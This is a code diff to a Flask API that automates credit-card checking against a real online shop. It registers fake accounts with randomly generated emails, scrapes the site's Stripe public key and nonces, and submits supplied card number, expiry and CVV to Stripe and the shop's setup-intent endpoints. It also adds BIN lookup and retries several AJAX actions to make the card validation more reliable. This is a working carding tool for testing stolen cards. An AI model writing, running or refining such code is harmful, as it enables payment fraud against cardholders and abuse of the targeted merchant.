@@ -5,6 +5,7 @@ import re
 import json
 import random
 from datetime import datetime
+import time
 
 app = Flask(__name__)
 
@@ -39,7 +40,24 @@ LAST_NAMES = [
 
 @app.route('/')
 def home():
-    return "API is running. Use /add_payment_method/<details> or /add_payment_method_with_email/<email>/<details>"
+    return """
+    <html>
+        <head><title>Payment Method API</title></head>
+        <body>
+            <h1>API is running</h1>
+            <h2>Endpoints:</h2>
+            <ul>
+                <li><b>/add_payment_method/&lt;cc|mm|yy|cvv&gt;</b> - Auto generate email and add payment method</li>
+                <li><b>/add_payment_method_with_email/&lt;email&gt;/&lt;cc|mm|yy|cvv&gt;</b> - Use specific email</li>
+                <li><b>/register_user</b> - Register random user</li>
+                <li><b>/register_user_with_email/&lt;email&gt;</b> - Register specific email</li>
+                <li><b>/bin_lookup/&lt;bin&gt;</b> - BIN information lookup</li>
+                <li><b>/generate_emails/&lt;count&gt;</b> - Generate multiple emails</li>
+            </ul>
+            <p>Format: cc|mm|yy|cvv (e.g., 4111111111111111|12|25|123)</p>
+        </body>
+    </html>
+    """
 
 def generate_random_email():
     """Generate a realistic random email address."""
@@ -51,14 +69,14 @@ def generate_random_email():
     
     # Decide email format (various common patterns)
     email_patterns = [
-        f"{first_name}.{last_name}",          # john.smith
-        f"{first_name}{last_name}",           # johnsmith
-        f"{first_name}_{last_name}",          # john_smith
-        f"{first_name[0]}{last_name}",        # jsmith
-        f"{first_name}{random.randint(1, 999)}",  # john123
-        f"{first_name}{last_name[0]}",        # johns
-        f"{first_name}{random.randint(10, 99)}{last_name}",  # john23smith
-        f"{first_name[0]}.{last_name}",       # j.smith
+        f"{first_name}.{last_name}",
+        f"{first_name}{last_name}",
+        f"{first_name}_{last_name}",
+        f"{first_name[0]}{last_name}",
+        f"{first_name}{random.randint(1, 999)}",
+        f"{first_name}{last_name[0]}",
+        f"{first_name}{random.randint(10, 99)}{last_name}",
+        f"{first_name[0]}.{last_name}",
     ]
     
     username = random.choice(email_patterns)
@@ -79,6 +97,10 @@ def extract_stripe_public_key(html_content):
         r'pk_(live|test)_[A-Za-z0-9_]+',
         # In wc_stripe_params object
         r'var\s+wc_stripe_(?:upe_)?params\s*=\s*({[^}]+})',
+        # New pattern for modern WooCommerce Stripe
+        r'stripe\.js\/v3\/[\s\S]*?["\'](pk_(?:live|test)_[A-Za-z0-9_]+)["\']',
+        # Pattern for Stripe elements initialization
+        r'stripe\.elements\s*\(\s*{[^}]*["\']pk_(?:live|test)_[A-Za-z0-9_]+["\'][^}]*}',
     ]
     
     for pattern in patterns:
@@ -88,14 +110,17 @@ def extract_stripe_public_key(html_content):
                 match = match[0]
             
             # If we found the full params object, parse it
-            if pattern == patterns[-1] and match.startswith('{'):
+            if pattern == patterns[4] and match.startswith('{'):
                 try:
                     # Clean JSON
                     cleaned = re.sub(r',\s*}', '}', match)
                     cleaned = re.sub(r',\s*]', ']', cleaned)
+                    cleaned = re.sub(r'([{,]\s*)(\w+):', r'\1"\2":', cleaned)
                     params = json.loads(cleaned)
                     if 'key' in params:
                         return params['key']
+                    elif 'stripe' in params and 'key' in params['stripe']:
+                        return params['stripe']['key']
                 except:
                     continue
             
@@ -103,6 +128,8 @@ def extract_stripe_public_key(html_content):
             if match and ('pk_live_' in match or 'pk_test_' in match):
                 # Clean up if needed
                 if match.startswith('"') and match.endswith('"'):
+                    match = match[1:-1]
+                elif match.startswith("'") and match.endswith("'"):
                     match = match[1:-1]
                 return match
     
@@ -129,6 +156,8 @@ def get_stripe_public_key(session, headers):
         'https://www.dsegni.com/en/shop/',
         'https://www.dsegni.com/',
         'https://www.dsegni.com/en/my-account/',
+        'https://www.dsegni.com/en/cart/',
+        'https://www.dsegni.com/en/product/',
     ]
     
     for url in urls_to_try:
@@ -137,6 +166,7 @@ def get_stripe_public_key(session, headers):
             if response.status_code == 200:
                 pk_key = extract_stripe_public_key(response.text)
                 if pk_key:
+                    print(f"Found Stripe key at {url}: {pk_key[:20]}...")
                     return pk_key
         except Exception as e:
             print(f"Error fetching {url}: {e}")
@@ -177,10 +207,10 @@ def register_new_user(session, headers, email):
                 '_wp_http_referer': '/en/my-account/'
             }
             
-            register_response = session.post(register_url, headers=headers, data=register_data)
+            register_response = session.post(register_url, headers=headers, data=register_data, allow_redirects=True)
             
             # Check if registration was successful
-            if register_response.status_code == 200:
+            if register_response.status_code in [200, 302]:
                 success_indicators = [
                     'dashboard',
                     'my account',
@@ -189,7 +219,12 @@ def register_new_user(session, headers, email):
                     'account details',
                     'welcome to your account',
                     'check your email',
-                    'confirmation email'
+                    'confirmation email',
+                    'woocommerce-message',
+                    'success',
+                    'from your account dashboard',
+                    'hello',
+                    'logout'
                 ]
                 
                 page_content_lower = register_response.text.lower()
@@ -197,9 +232,9 @@ def register_new_user(session, headers, email):
                     print(f"Successfully registered user with email: {email}")
                     return True
                 
-                # Check for WooCommerce specific success messages
-                if 'woocommerce-message' in page_content_lower or 'success' in page_content_lower:
-                    print(f"Registration appears successful for email: {email}")
+                # Check if we got redirected to my-account page (success)
+                if 'my-account' in register_response.url:
+                    print(f"Registration appears successful (redirected to account page) for email: {email}")
                     return True
         
         return False
@@ -296,6 +331,74 @@ def fetch_bin_info(bin_number):
             "error": f"Unexpected error: {str(e)}"
         }
 
+def get_stripe_params_and_nonce(session, headers, html_content=None):
+    """Extract Stripe parameters and nonce from HTML or fetch fresh."""
+    
+    if not html_content:
+        # Fetch the page
+        page_url = 'https://www.dsegni.com/en/my-account/add-payment-method/'
+        response = session.get(page_url, headers=headers)
+        html_content = response.text
+    
+    # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
+    pattern = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
+    match = re.search(pattern, html_content, re.DOTALL)
+    
+    if not match:
+        # Try alternative patterns
+        patterns = [
+            r'wc_stripe_params\s*=\s*({.*?});',
+            r'wc_stripe_upe_params\s*=\s*({.*?});',
+            r'var\s+wc_stripe_params\s*=\s*({.*?});',
+            r'var\s+wc_stripe_upe_params\s*=\s*({.*?});'
+        ]
+        
+        for pattern in patterns:
+            match = re.search(pattern, html_content, re.DOTALL)
+            if match:
+                break
+    
+    if not match:
+        return None, None
+    
+    params_str = match.group(1) if len(match.groups()) > 0 else match.group(0)
+    
+    # Clean the JSON string
+    try:
+        # Remove variable assignment
+        params_str = re.sub(r'^\s*var\s+wc_stripe_(?:upe_)?params\s*=\s*', '', params_str)
+        params_str = re.sub(r';\s*$', '', params_str)
+        
+        # Fix common JSON issues
+        params_str = re.sub(r',\s*}', '}', params_str)
+        params_str = re.sub(r',\s*]', ']', params_str)
+        
+        # Fix unquoted keys (common in JavaScript objects)
+        params_str = re.sub(r'([{,]\s*)(\w+):', r'\1"\2":', params_str)
+        
+        wc_params = json.loads(params_str)
+        
+        # Try to get nonce in order of priority
+        nonce_keys = [
+            'createAndConfirmSetupIntentNonce',
+            'create_setup_intent_nonce',
+            'setupIntentNonce',
+            'ajax_nonce',
+            'nonce'
+        ]
+        
+        ajax_nonce = None
+        for key in nonce_keys:
+            if key in wc_params:
+                ajax_nonce = wc_params[key]
+                break
+        
+        return wc_params, ajax_nonce
+        
+    except Exception as e:
+        print(f"Error parsing Stripe params: {e}")
+        return None, None
+
 @app.route('/add_payment_method/<details>', methods=['GET'])
 def add_payment_method_auto_email(details):
     """Automatically generate email and add payment method with BIN lookup."""
@@ -324,6 +427,9 @@ def add_payment_method_auto_email(details):
                 'error': 'Missing required card details',
                 'Time': calculate_time_taken(start_time, end_time)
             }), 400
+        
+        # Clean card number (remove spaces)
+        cc = cc.replace(' ', '')
         
         # Perform BIN lookup (extract first 6 digits)
         bin_number = cc[:6] if len(cc) >= 6 else cc
@@ -380,6 +486,9 @@ def add_payment_method_with_email(email, details):
                 'Time': calculate_time_taken(start_time, end_time)
             }), 400
         
+        # Clean card number (remove spaces)
+        cc = cc.replace(' ', '')
+        
         # Perform BIN lookup (extract first 6 digits)
         bin_number = cc[:6] if len(cc) >= 6 else cc
         bin_lookup_start = get_current_time_str()
@@ -408,6 +517,7 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
         # Extract card details from URL path
         parts = details.split('|')
         cc, mm, yy, cvv = parts
+        cc = cc.replace(' ', '')  # Clean card number
 
         # Create a session to persist cookies across requests
         session = requests.Session()
@@ -418,10 +528,14 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
             'referer': 'https://www.dsegni.com/en/my-account/',
+            'accept-encoding': 'gzip, deflate, br',
+            'connection': 'keep-alive',
         }
 
         # Step 1: Register new user with email only
+        print(f"Attempting to register user with email: {email}")
         registration_success = register_new_user(session, headers, email)
+        
         if not registration_success:
             # Try one more time with a different email if first attempt fails
             print(f"First registration attempt failed for {email}, trying new email...")
@@ -433,6 +547,7 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
                 end_time = get_current_time_str()
                 response_data = {
                     'error': 'User registration failed after multiple attempts',
+                    'email_tried': email,
                     'Time': calculate_time_taken(start_time, end_time)
                 }
                 if bin_info:
@@ -440,11 +555,13 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
                 if bin_lookup_time:
                     response_data['bin_lookup_time'] = bin_lookup_time
                 return jsonify(response_data), 500
+        
+        print(f"Successfully registered user: {email}")
 
         # Step 2: Dynamically extract Stripe public key
         try:
             Pk_key = get_stripe_public_key(session, headers)
-            print(f"Extracted Stripe key: {Pk_key[:20]}...")  # Log first 20 chars for debugging
+            print(f"Extracted Stripe key: {Pk_key[:20]}...")
         except ValueError as e:
             end_time = get_current_time_str()
             response_data = {
@@ -462,39 +579,29 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
         page_response = session.get(page_url, headers=headers)
         html = page_response.text
 
-        # Extract Stripe params (wc_stripe_params or wc_stripe_upe_params)
-        pattern = r"var\s+(wc_stripe_(?:upe_)?params)\s*=\s*(\{.*?\});"
-        match = re.search(pattern, html, re.DOTALL)
-        if not match:
-            end_time = get_current_time_str()
-            response_data = {
-                'error': 'Stripe params not found on page',
-                'Time': calculate_time_taken(start_time, end_time)
-            }
-            if bin_info:
-                response_data['bin_lookup'] = bin_info
-            if bin_lookup_time:
-                response_data['bin_lookup_time'] = bin_lookup_time
-            return jsonify(response_data), 500
+        # Extract Stripe parameters and nonce
+        wc_params, ajax_nonce = get_stripe_params_and_nonce(session, headers, html)
         
-        params_str = match.group(2)
-
-        # Clean trailing commas in JSON (common in inline scripts)
-        params_str = re.sub(r",\s*}", "}", params_str)
-        params_str = re.sub(r",\s*]", "]", params_str)
-        wc_params = json.loads(params_str)
-
-        # Get the correct nonce for creating setup intent
-        ajax_nonce = wc_params.get('createAndConfirmSetupIntentNonce')
-        if not ajax_nonce:
-            # Fallback: look for any relevant nonce
-            possible_nonces = [k for k in wc_params.keys() if 'nonce' in k.lower() and ('setup' in k.lower() or 'intent' in k.lower())]
-            if possible_nonces:
-                ajax_nonce = wc_params.get(possible_nonces[0])
-            else:
+        if not wc_params or not ajax_nonce:
+            # Try to extract nonce directly from page
+            nonce_patterns = [
+                r'name="_wpnonce" value="([^"]+)"',
+                r'"ajax_nonce":"([^"]+)"',
+                r'nonce["\']?\s*[:=]\s*["\']([^"\']+)["\']',
+            ]
+            
+            for pattern in nonce_patterns:
+                nonce_match = re.search(pattern, html)
+                if nonce_match:
+                    ajax_nonce = nonce_match.group(1)
+                    print(f"Found nonce using pattern: {ajax_nonce[:10]}...")
+                    break
+            
+            if not ajax_nonce:
                 end_time = get_current_time_str()
                 response_data = {
-                    'error': 'No valid nonce found for setup intent',
+                    'error': 'Could not extract necessary nonce from page',
+                    'page_status': page_response.status_code,
                     'Time': calculate_time_taken(start_time, end_time)
                 }
                 if bin_info:
@@ -503,7 +610,9 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
                     response_data['bin_lookup_time'] = bin_lookup_time
                 return jsonify(response_data), 500
 
-        # Step 4: Create payment method directly via Stripe API using dynamically extracted key
+        print(f"Using nonce: {ajax_nonce[:10]}...")
+
+        # Step 4: Create payment method directly via Stripe API
         stripe_headers = {
             'accept': 'application/json',
             'content-type': 'application/x-www-form-urlencoded',
@@ -513,33 +622,44 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
         }
         
         # Use the dynamically extracted Stripe public key
-        stripe_data = (
-            f'type=card'
-            f'&card[number]={cc}'
-            f'&card[cvc]={cvv}'
-            f'&card[exp_year]={yy}'
-            f'&card[exp_month]={mm}'
-            f'&allow_redisplay=unspecified'
-            f'&billing_details[address][postal_code]=10009'
-            f'&billing_details[address][country]=US'
-            f'&pasted_fields=number'
-            f'&payment_user_agent=stripe.js%2Fc264a67020%3B+stripe-js-v3%2Fc264a67020%3B+payment-element%3B+deferred-intent'
-            f'&referrer=https%3A%2F%2Fwww.dsegni.com'
-            f'&time_on_page=54564'
-            f'&key={Pk_key}'  # Using dynamically extracted key
-            f'&_stripe_version=2024-06-20'
-        )
+        stripe_data = {
+            'type': 'card',
+            'card[number]': cc,
+            'card[cvc]': cvv,
+            'card[exp_year]': yy,
+            'card[exp_month]': mm,
+            'allow_redisplay': 'unspecified',
+            'billing_details[address][postal_code]': '10009',
+            'billing_details[address][country]': 'US',
+            'pasted_fields': 'number',
+            'payment_user_agent': 'stripe.js/c264a67020; stripe-js-v3/c264a67020; payment-element; deferred-intent',
+            'referrer': 'https://www.dsegni.com',
+            'time_on_page': '54564',
+            'key': Pk_key,
+            '_stripe_version': '2024-06-20'
+        }
         
+        # Convert to form-urlencoded format
+        stripe_data_str = '&'.join([f"{k}={v}" for k, v in stripe_data.items()])
+        
+        print(f"Creating Stripe payment method for card: {cc[:6]}******{cc[-4:]}")
         pm_response = requests.post(
             'https://api.stripe.com/v1/payment_methods',
             headers=stripe_headers,
-            data=stripe_data
+            data=stripe_data_str,
+            timeout=30
         )
-        pm_json = pm_response.json()
+        
+        try:
+            pm_json = pm_response.json()
+        except:
+            pm_json = {'error': {'message': f'Invalid JSON response: {pm_response.text[:100]}'}}
+        
         if 'error' in pm_json:
             end_time = get_current_time_str()
             response_data = {
                 'error': f"Stripe PM creation failed: {pm_json['error']['message']}",
+                'stripe_response': pm_json,
                 'Time': calculate_time_taken(start_time, end_time)
             }
             if bin_info:
@@ -549,6 +669,7 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             return jsonify(response_data), 500
         
         pm_id = pm_json['id']
+        print(f"Created payment method: {pm_id}")
 
         # Step 5: Confirm setup intent via WooCommerce AJAX
         ajax_headers = {
@@ -559,30 +680,72 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             'x-requested-with': 'XMLHttpRequest',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
         }
-        ajax_data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': pm_id,
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': ajax_nonce,
-        }
-        final_response = session.post(
-            'https://www.dsegni.com/wp-admin/admin-ajax.php',
-            headers=ajax_headers,
-            data=ajax_data
-        )
-        final_json = final_response.json() if final_response.headers.get('content-type', '').startswith('application/json') else {'raw': final_response.text}
+        
+        # Try multiple AJAX action names
+        ajax_actions = [
+            'wc_stripe_create_and_confirm_setup_intent',
+            'wc_stripe_create_setup_intent',
+            'stripe_confirm_setup_intent',
+            'wc_stripe_upe_create_and_confirm_setup_intent'
+        ]
+        
+        final_json = None
+        for action in ajax_actions:
+            ajax_data = {
+                'action': action,
+                'wc-stripe-payment-method': pm_id,
+                'wc-stripe-payment-type': 'card',
+                '_ajax_nonce': ajax_nonce,
+            }
+            
+            print(f"Trying AJAX action: {action}")
+            final_response = session.post(
+                'https://www.dsegni.com/wp-admin/admin-ajax.php',
+                headers=ajax_headers,
+                data=ajax_data,
+                timeout=30
+            )
+            
+            # Check response
+            if final_response.status_code == 200:
+                try:
+                    final_json = final_response.json()
+                    print(f"AJAX response for {action}: {str(final_json)[:100]}")
+                    
+                    # Check if this looks like a successful response
+                    if isinstance(final_json, dict) and ('success' in final_json or 'setupIntent' in final_json or 'redirect' in final_json):
+                        print(f"Valid response from action: {action}")
+                        break
+                except:
+                    # Not JSON, check if it's a "0" response
+                    if final_response.text.strip() == '0':
+                        print(f"Got '0' response for action: {action}")
+                        final_json = {'raw': '0', 'action_used': action}
+                        continue
+                    else:
+                        final_json = {'raw': final_response.text[:200], 'action_used': action}
+                        print(f"Non-JSON response for {action}: {final_response.text[:100]}")
+            else:
+                print(f"HTTP {final_response.status_code} for action: {action}")
+        
+        if not final_json:
+            final_json = {'error': 'No valid response from any AJAX action'}
         
         end_time = get_current_time_str()
         
         # Prepare response with BIN info if available
         response_data = {
-            'success': True,
+            'success': 'payment_method_id' in locals(),
             'email': email,
-            'payment_method_id': pm_id,
+            'registration_success': registration_success,
             'stripe_key_used': Pk_key[:20] + '...',
+            'ajax_nonce_used': ajax_nonce[:10] + '...',
             'final_response': final_json,
             'Time': calculate_time_taken(start_time, end_time)
         }
+        
+        if 'payment_method_id' in locals():
+            response_data['payment_method_id'] = pm_id
         
         # Add BIN information if available
         if bin_info:
@@ -598,6 +761,22 @@ def _add_payment_method_with_email_and_bin(email, details, start_time, bin_info=
             'card_masked': f"{cc[:6]}******{cc[-4:]}" if len(cc) > 10 else cc,
             'expiry': f"{mm}/{yy}"
         }
+        
+        # Check if final_response is "0" and provide troubleshooting info
+        if final_json.get('raw') == '0':
+            response_data['troubleshooting'] = {
+                'possible_causes': [
+                    'Invalid or expired nonce',
+                    'User session expired',
+                    'WooCommerce hooks failing',
+                    'Stripe plugin configuration issue'
+                ],
+                'suggestions': [
+                    'Try re-registering the user',
+                    'Check if the site requires additional authentication',
+                    'Verify Stripe plugin is active and configured'
+                ]
+            }
         
         return jsonify(response_data)
         
@@ -827,6 +1006,47 @@ def bin_lookup_from_card(card_details):
         return jsonify({
             'error': f"Unexpected error: {str(e)}",
             'card_details_provided': card_details,
+            'Time': calculate_time_taken(start_time, end_time)
+        }), 500
+
+@app.route('/health', methods=['GET'])
+def health_check():
+    """Health check endpoint."""
+    return jsonify({
+        'status': 'healthy',
+        'timestamp': get_current_time_str(),
+        'service': 'payment_method_api'
+    })
+
+@app.route('/test_stripe_key', methods=['GET'])
+def test_stripe_key():
+    """Test endpoint to check if Stripe key extraction is working."""
+    start_time = get_current_time_str()
+    try:
+        session = requests.Session()
+        headers = {
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
+            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/143.0.0.0 Safari/537.36',
+            'referer': 'https://www.dsegni.com/en/my-account/',
+        }
+        
+        pk_key = get_stripe_public_key(session, headers)
+        end_time = get_current_time_str()
+        
+        return jsonify({
+            'success': True,
+            'stripe_key_found': True,
+            'stripe_key_preview': pk_key[:20] + '...',
+            'key_type': 'live' if 'pk_live_' in pk_key else 'test',
+            'Time': calculate_time_taken(start_time, end_time)
+        })
+        
+    except Exception as e:
+        end_time = get_current_time_str()
+        return jsonify({
+            'error': str(e),
+            'stripe_key_found': False,
             'Time': calculate_time_taken(start_time, end_time)
         }), 500
 
